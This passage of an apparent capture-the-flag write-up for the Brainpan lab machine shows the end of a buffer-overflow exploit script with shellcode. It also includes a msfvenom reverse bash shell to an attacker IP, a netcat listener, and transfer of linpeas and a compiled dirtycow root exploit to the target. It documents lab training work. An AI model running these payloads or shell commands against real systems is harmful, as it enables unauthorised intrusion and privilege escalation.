</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xed\x17\x85\x9d\x03\x01\x3f\x83\xd9\xd7\x78\x07</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x06\x24\x86\x86\xcb\x10\xac\x98\x15\x98\xe8\xcc</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc9\xcf\xa6\xba\xaf\xb9\x08\x14\x66\x15\xc3\xf0</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xff\x55\xd4\x86\xff\xb3\xa2\x66\xb1\x6d\xf3\x99</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x7e\xfa\xf3\xe2\x62\x9a\xfc\x39\x27\xaa\xb6\x63</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0e\x23\x1f\xf6\x12\x2e\xa0\x2d\x50\x57\x23\xc7</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x29\xac\x3b\xa2\x2c\xe8\xfb\x5f\x5d\x61\x6e\x5f</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf2\x82\xbb</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>postfix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> (total_payload_size <span style=color:#f92672>-</span> offset <span style=color:#f92672>-</span> len(retn) <span style=color:#f92672>-</span> len(padding) <span style=color:#f92672>-</span> len(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([
</span></span><span style=display:flex><span>    overflow,
</span></span><span style=display:flex><span>    retn,
</span></span><span style=display:flex><span>    padding,
</span></span><span style=display:flex><span>    payload,
</span></span><span style=display:flex><span>    postfix
</span></span><span style=display:flex><span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send exploit</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sending payload</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;&gt;&gt; &#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sending payload of </span><span style=color:#e6db74>{</span>len(buffer)<span style=color:#e6db74>}</span><span style=color:#e6db74> bytes&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(buffer)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># cleanup</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span></code></pre></div><p>I then started a listener and fired off the exploit, happily I caught a shell as a user, <code>puck</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Z:<span style=color:#ae81ff>\h</span>ome<span style=color:#ae81ff>\p</span>uck&gt;dir
</span></span><span style=display:flex><span>Volume in drive Z has no label.
</span></span><span style=display:flex><span>Volume Serial Number is 0000-0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Directory of Z:<span style=color:#ae81ff>\h</span>ome<span style=color:#ae81ff>\p</span>uck
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  3/6/2013   2:23 PM  &lt;DIR&gt;         .
</span></span><span style=display:flex><span>  3/4/2013  10:49 AM  &lt;DIR&gt;         ..
</span></span><span style=display:flex><span>  3/6/2013   2:23 PM           <span style=color:#ae81ff>513</span>  checksrv.sh
</span></span><span style=display:flex><span>  3/4/2013   1:45 PM  &lt;DIR&gt;         web
</span></span><span style=display:flex><span>       <span style=color:#ae81ff>1</span> file                       <span style=color:#ae81ff>513</span> bytes
</span></span><span style=display:flex><span>       <span style=color:#ae81ff>3</span> directories     13,850,206,208 bytes free
</span></span></code></pre></div><p>While this shell appeared to be a <code>CMD</code> shell the directory structure and files immediately did not look like a windows environment. Enumeration quickly confirmed this was not a bog standard windows host.</p><h3 id=enumerating-the-host>Enumerating the Host <a href=#enumerating-the-host class=anchor>üîó</a></h3><p>It was clear that this was either a linux host somehow running <code>CMD</code>, or at a minimum a mount to a linux volume.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Z:\&gt;dir
</span></span><span style=display:flex><span>Volume <span style=color:#66d9ef>in</span> drive Z has no label.
</span></span><span style=display:flex><span>Volume Serial Number is <span style=color:#ae81ff>0000</span>-<span style=color:#ae81ff>0000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Directory of Z:\
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>02</span> PM  &lt;DIR&gt;         bin
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>19</span> AM  &lt;DIR&gt;         boot
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>22</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>26</span> PM  &lt;DIR&gt;         etc
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>49</span> AM  &lt;DIR&gt;         home
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>18</span> AM    <span style=color:#ae81ff>15</span>,<span style=color:#ae81ff>084</span>,<span style=color:#ae81ff>717</span>  initrd.img
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>18</span> AM    <span style=color:#ae81ff>15</span>,<span style=color:#ae81ff>084</span>,<span style=color:#ae81ff>717</span>  initrd.img.old
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>04</span> PM  &lt;DIR&gt;         lib
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span> AM  &lt;DIR&gt;         lost+found
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span> AM  &lt;DIR&gt;         media
</span></span><span style=display:flex><span> <span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>9</span>/<span style=color:#ae81ff>2012</span>   <span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>59</span> AM  &lt;DIR&gt;         mnt
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> AM  &lt;DIR&gt;         opt
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>7</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>07</span> PM  &lt;DIR&gt;         root
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>22</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>26</span> PM  &lt;DIR&gt;         run
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span> AM  &lt;DIR&gt;         sbin
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>/<span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>2012</span>   <span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>43</span> AM  &lt;DIR&gt;         selinux
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> AM  &lt;DIR&gt;         srv
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>22</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>34</span> PM  &lt;DIR&gt;         tmp
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>3</span>/<span style=color:#ae81ff>4</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>9</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> AM  &lt;DIR&gt;         usr
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>8</span>/<span style=color:#ae81ff>5</span>/<span style=color:#ae81ff>2019</span>   <span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>47</span> PM  &lt;DIR&gt;         var
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>/<span style=color:#ae81ff>25</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>32</span> PM     <span style=color:#ae81ff>5</span>,<span style=color:#ae81ff>180</span>,<span style=color:#ae81ff>432</span>  vmlinuz
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>/<span style=color:#ae81ff>25</span>/<span style=color:#ae81ff>2013</span>   <span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>32</span> PM     <span style=color:#ae81ff>5</span>,<span style=color:#ae81ff>180</span>,<span style=color:#ae81ff>432</span>  vmlinuz.old
</span></span><span style=display:flex><span>       <span style=color:#ae81ff>4</span> files               <span style=color:#ae81ff>40</span>,<span style=color:#ae81ff>530</span>,<span style=color:#ae81ff>298</span> bytes
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>17</span> directories     <span style=color:#ae81ff>13</span>,<span style=color:#ae81ff>850</span>,<span style=color:#ae81ff>206</span>,<span style=color:#ae81ff>208</span> bytes free
</span></span></code></pre></div><p>With a little digging, I was excited to find that I could execute commands on this linux machine. With this in mind I decided to leverage a reverse bash shell to migrate into the underlying linux host.</p><p>To facilitate this, I generated the shell using msfvenom again before executing this directly through <code>bash</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# msfvenom -p cmd/unix/reverse_bash LHOST<span style=color:#f92672>=</span>10.10.176.118 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: cmd from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>66</span> bytes
</span></span><span style=display:flex><span>0&lt;&amp;137-;exec 137&lt;&gt;/dev/tcp/10.10.176.118/4443;sh &lt;&amp;<span style=color:#ae81ff>137</span> &gt;&amp;<span style=color:#ae81ff>137</span> 2&gt;&amp;<span style=color:#ae81ff>137</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Z:<span style=color:#ae81ff>\&gt;</span>/bin/bash -c <span style=color:#e6db74>&#34;0&lt;&amp;137-;exec 137&lt;&gt;/dev/tcp/10.10.176.118/4443;sh &lt;&amp;137 &gt;&amp;137 2&gt;&amp;137&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# nc -lvnp <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.176.118<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.42.127<span style=color:#f92672>]</span> <span style=color:#ae81ff>51982</span>
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>bin
</span></span><span style=display:flex><span>boot
</span></span><span style=display:flex><span>dev
</span></span><span style=display:flex><span>etc
</span></span><span style=display:flex><span>home
</span></span><span style=display:flex><span>initrd.img
</span></span><span style=display:flex><span>initrd.img.old
</span></span><span style=display:flex><span>lib
</span></span><span style=display:flex><span>lost+found
</span></span><span style=display:flex><span>media
</span></span><span style=display:flex><span>mnt
</span></span><span style=display:flex><span>opt
</span></span><span style=display:flex><span>proc
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>run
</span></span><span style=display:flex><span>sbin
</span></span><span style=display:flex><span>selinux
</span></span><span style=display:flex><span>srv
</span></span><span style=display:flex><span>sys
</span></span><span style=display:flex><span>tmp
</span></span><span style=display:flex><span>usr
</span></span><span style=display:flex><span>var
</span></span><span style=display:flex><span>vmlinuz
</span></span><span style=display:flex><span>vmlinuz.old
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>puck
</span></span></code></pre></div><p>Again I caught a raw shell via a listening <code>netcat</code> instance.</p><h3 id=stabilizing-my-limited-shell-to-a-full-tty>Stabilizing my limited shell to a full TTY <a href=#stabilizing-my-limited-shell-to-a-full-tty class=anchor>üîó</a></h3><p>Given I could be on this shell a while, I wanted to stabilize it to something I couldn&rsquo;t accidentally blow away with a rogue <code>^c</code>. I knew that the host had python 2.7 on it from the earlier <code>nmap</code> scans and decided to use the <code>import pty</code> trick to migrate this shell into a new pty.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python --version
</span></span><span style=display:flex><span>Python 2.7.3
</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>puck@brainpan:/$
</span></span><span style=display:flex><span>puck@brainpan:/$ ^Z
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>+  Stopped                 nc -lvnp <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# stty raw -echo; fg;
</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span>             ls
</span></span><span style=display:flex><span>bin   etc         initrd.img.old  media  proc  sbin     sys  var
</span></span><span style=display:flex><span>boot  home        lib             mnt    root  selinux  tmp  vmlinuz
</span></span><span style=display:flex><span>dev   initrd.img  lost+found      opt    run   srv      usr  vmlinuz.old
</span></span><span style=display:flex><span>puck@brainpan:/$ export SHELL<span style=color:#f92672>=</span>/bin/bash
</span></span><span style=display:flex><span>puck@brainpan:/$ export TERM<span style=color:#f92672>=</span>screen
</span></span><span style=display:flex><span>puck@brainpan:/$
</span></span></code></pre></div><p>With a stabilized shell, it was time to start enumerating the host for anything valuable.</p><h3 id=enumerating-the-linux-target>Enumerating the linux target <a href=#enumerating-the-linux-target class=anchor>üîó</a></h3><p>I decided to use <code>linpeas</code> initially to generate a high-level overview of the host and created a transfer directory that I could uses as a webroot to migrate assets over to the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# mkdir transfer
</span></span><span style=display:flex><span>root@kali:~/ctf# cd transfer/
</span></span><span style=display:flex><span>root@kali:~/ctf/transfer# cp ~/Desktop/PEASS/linPEAS/linpeas.sh .
</span></span><span style=display:flex><span>root@kali:~/ctf/transfer# ls
</span></span><span style=display:flex><span>linpeas.sh
</span></span><span style=display:flex><span>root@kali:~/ctf/transfer# python3 -m http.server <span style=color:#ae81ff>8888</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8888</span> <span style=color:#f92672>(</span>http://0.0.0.0:8888/<span style=color:#f92672>)</span> ...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>puck@brainpan:~$ wget <span style=color:#e6db74>&#39;http://10.10.176.118:8888/linpeas.sh&#39;</span>
</span></span><span style=display:flex><span>--2020-12-22 22:43:59--  http://10.10.176.118:8888/linpeas.sh
</span></span><span style=display:flex><span>Connecting to 10.10.176.118:8888... connected.
</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>222579</span> <span style=color:#f92672>(</span>217K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>text/x-sh<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Saving to: <span style=color:#e6db74>`</span>linpeas.sh<span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>100%[======================================&gt;] 222,579     --.-K/s   in 0.002s  
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>2020-12-22 22:43:59 (96.8 MB/s) - `linpeas.sh&#39;</span> saved <span style=color:#f92672>[</span>222579/222579<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>puck@brainpan:~$ chmod +x linpeas.sh
</span></span><span style=display:flex><span>puck@brainpan:~$ ./linpeas.sh &gt; /tmp/localenum.txt
</span></span></code></pre></div><p>I kicked off the script and decided to walk away for a minute considering how strange this host truly was. When I came back I found that the enumeration returned a few potential paths forward. Most interestingly though, it confirmed that the host was running <code>wine</code> which explained the <code>cmd.exe</code> shell and windows binary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Finding <span style=color:#e6db74>&#39;username&#39;</span> string inside /home /var/www /var/backups /tmp /etc /root /mnt <span style=color:#f92672>(</span>limit 70<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/home/puck/.wine/dosdevices/z:/tmp/localenum.txt:USERNAME<span style=color:#f92672>=</span>puck
</span></span></code></pre></div><p>Additionally it identified a nopassword root binary that the <code>puck</code> user could execute via sudo which looked extremely likely as the vector of escalation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Testing <span style=color:#e6db74>&#39;sudo -l&#39;</span> without password &amp; /etc/sudoers
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> puck on this host:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User puck may run the following commands on this host:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /home/anansi/bin/anansi_util
</span></span></code></pre></div><p>I wasted roughly 15 minutes prodding at the <code>anansi_util</code> binary though before realizing the host might be vulnerable to a dirtycow escalation and that the <code>anansi_util</code> binary could have been a red herring.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>OS: Linux version 3.5.0-25-generic <span style=color:#f92672>(</span>buildd@lamiak<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>gcc version 4.7.2 <span style=color:#f92672>(</span>Ubuntu/Linaro 4.7.2-2ubuntu1<span style=color:#f92672>)</span> <span style=color:#f92672>)</span> <span style=color:#75715e>#39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013</span>
</span></span><span style=display:flex><span>User &amp; Groups: uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>puck<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>puck<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>puck<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Hostname: brainpan
</span></span><span style=display:flex><span>Writable folder: /home/puck
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>puck@brainpan:~$ uname -a
</span></span><span style=display:flex><span>Linux brainpan 3.5.0-25-generic <span style=color:#75715e>#39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux</span>
</span></span></code></pre></div><h3 id=building-dirtycow>Building dirtycow <a href=#building-dirtycow class=anchor>üîó</a></h3><p>I decided to reach for the original Christian &ldquo;FireFart&rdquo; Mehlmauer implementation of dirtycow because it generated a new user that collided with the root uid/gid, effectively giving me access to a root user. I pulled down the C code from his repo and fetched the x86 dependencies I needed to build it, planning to build a statically linked binary that I could just drop on the host to make my life the easier.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
</span></span><span style=display:flex><span>root@kali:~/ctf# sed -i dirty.c <span style=color:#e6db74>&#39;s/firefart/cb/g&#39;</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# dpkg --add-architecture i386
</span></span><span style=display:flex><span>root@kali:~/ctf# apt-get update <span style=color:#f92672>&amp;&amp;</span> apt-get install -y libcrypt-dev:i386 libc6-dev-i386
</span></span><span style=display:flex><span>root@kali:~/ctf# gcc -static -m32 -pthread dirty.c -o dirty -lcrypt
</span></span><span style=display:flex><span>root@kali:~/ctf# ldd dirty
</span></span><span style=display:flex><span>        not a dynamic executable
</span></span><span style=display:flex><span>root@kali:~/ctf# readelf -h dirty
</span></span><span style=display:flex><span>ELF Header:
</span></span><span style=display:flex><span>  Magic:   7f <span style=color:#ae81ff>45</span> 4c <span style=color:#ae81ff>46</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>03</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 
</span></span><span style=display:flex><span>  Class:                             ELF32
</span></span><span style=display:flex><span>  Data:                              2<span style=color:#960050;background-color:#1e0010>&#39;</span>s complement, little endian
</span></span><span style=display:flex><span>  Version:                           <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>current<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  OS/ABI:                            UNIX - GNU
</span></span><span style=display:flex><span>  ABI Version:                       <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  Type:                              EXEC <span style=color:#f92672>(</span>Executable file<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Machine:                           Intel <span style=color:#ae81ff>80386</span>
</span></span><span style=display:flex><span>  Version:                           0x1
</span></span><span style=display:flex><span>  Entry point address:               0x8049cc0
</span></span><span style=display:flex><span>  Start of program headers:          <span style=color:#ae81ff>52</span> <span style=color:#f92672>(</span>bytes into file<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Start of section headers:          <span style=color:#ae81ff>1288232</span> <span style=color:#f92672>(</span>bytes into file<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Flags:                             0x0
</span></span><span style=display:flex><span>  Size of this header:               <span style=color:#ae81ff>52</span> <span style=color:#f92672>(</span>bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Size of program headers:           <span style=color:#ae81ff>32</span> <span style=color:#f92672>(</span>bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Number of program headers:         <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>  Size of section headers:           <span style=color:#ae81ff>40</span> <span style=color:#f92672>(</span>bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Number of section headers:         <span style=color:#ae81ff>37</span>
</span></span><span style=display:flex><span>  Section header string table index: <span style=color:#ae81ff>36</span>
</span></span></code></pre></div><p>I restarted the python webserver and transfered the malicious binary over to the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# cp dirty transfer/
</span></span><span style=display:flex><span>root@kali:~/ctf# cd transfer/
</span></span><span style=display:flex><span>root@kali:~/ctf/transfer# python3 -m http.server <span style=color:#ae81ff>8888</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8888</span> <span style=color:#f92672>(</span>http://0.0.0.0:8888/<span style=color:#f92672>)</span> ...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>puck@brainpan:~$ wget <span style=color:#e6db74>&#39;http://10.10.176.118:8888/dirty&#39;</span>
</span></span><span style=display:flex><span>--2020-12-22 23:02:59--  http://10.10.176.118:8888/dirty
</span></span><span style=display:flex><span>Connecting to 10.10.176.118:8888... connected.
</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>1289712</span> <span style=color:#f92672>(</span>1.2M<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>application/octet-stream<span style=color:#f92672>]</span>
